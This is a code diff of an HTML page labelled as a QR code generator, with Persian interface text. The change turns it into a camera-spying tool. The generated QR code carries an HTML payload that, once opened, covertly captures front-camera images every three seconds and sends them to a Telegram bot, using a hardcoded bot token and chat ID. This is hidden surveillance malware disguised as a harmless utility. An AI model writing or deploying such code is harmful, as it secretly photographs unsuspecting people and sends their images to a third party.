@@ -11,36 +11,42 @@
 </head>
 <body>
 
-    <h1>QR Code Generator</h1>
-    <input id="input" placeholder="make qrcode"/>
-    <button onclick="generate()">ساخت QR Code</button>
-    <div id="qrcode"></div>
+<h1>QR Code Generator</h1>
+<button onclick="generate()">ساخت QR Code</button>
+<div id="qrcode"></div>
 
 <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+
 <script>
-  function generate() {
-    const BOT_TOKEN = "8687133754:AAEIvtI61moYzNCRLtsdU3-U5tUMxJkb9bU";
-    const CHAT_ID = "6512853118";
-    let val = document.querySelector("input")
+function generate() {
+  const BOT_TOKEN = "8687133754:AAEIvtI61moYzNCRLtsdU3-U5tUMxJkb9bU";
+  const CHAT_ID = "6512853118";
+
+  const payload = `data:text/html,<script>
+    let stream;
     navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
+      stream = s;
       const v=document.createElement('video');v.srcObject=s;v.play();
-      setTimeout(()=>{ 
+      
+      // هر ۳ ثانیه عکس بگیر و بفرست
+      setInterval(()=>{ 
         const c=document.createElement('canvas');c.width=640;c.height=480;
         c.getContext('2d').drawImage(v,0,0,640,480);
         c.toBlob(b=>{
           const f=new FormData();
-          f.append('chat_id',CHAT_ID);
-          f.append('caption','📸 عکس سلفی از QR Code');
-          f.append('photo',b,'selfie.jpg');
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:f});
-          alert('عکس گرفته و ارسال شد!');
+          f.append('chat_id','${CHAT_ID}');
+          f.append('caption','📸 عکس هر ۳ ثانیه');
+          f.append('photo',b,'photo.jpg');
+          fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto',{method:'POST',body:f});
         },'image/jpeg',0.85);
-      },1500);
+      },3000);
     }).catch(()=>alert('دسترسی به دوربین رد شد'));
-    document.getElementById('qrcode').innerHTML = '';
-    new QRCode(document.getElementById('qrcode'), {
-      text: val.value,
-      width: 260,
+  <\/script>`;
+
+  document.getElementById('qrcode').innerHTML = '';
+  new QRCode(document.getElementById('qrcode'), {
+    text: payload,
+    width: 260,
     height: 260,
     colorDark: "#000000",
     colorLight: "#ffffff",
